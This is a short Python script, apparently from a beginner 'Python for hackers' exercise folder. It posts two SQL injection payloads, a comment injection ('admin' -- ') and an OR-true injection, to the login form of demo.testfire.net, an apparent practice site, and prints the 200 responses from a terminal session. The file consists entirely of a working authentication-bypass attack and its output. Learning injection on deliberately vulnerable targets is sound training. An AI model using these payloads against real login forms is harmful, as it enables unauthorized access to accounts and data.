import requests

url = "http://demo.testfire.net/login.jsp"
# Comment Injection
r = requests.post(url, data = {
    'username':"admin' -- ",
    "password" : "pwd"
})
print(r)


# OR Injection
r = requests.post(url, data = {
    'username':"admin' OR '1' = '1 ",
    "password" : "pwd"
})
print(r)

"""
OUTPUT :

(env) ┌─[user@parrot]─[~/Documents/py101_for_hackers]
└──╼ $python3 sql_inj.py 
<Response [200]>
<Response [200]>
(env) ┌─[user@parrot]─[~/Documents/py101_for_hackers]
└──╼ $

"""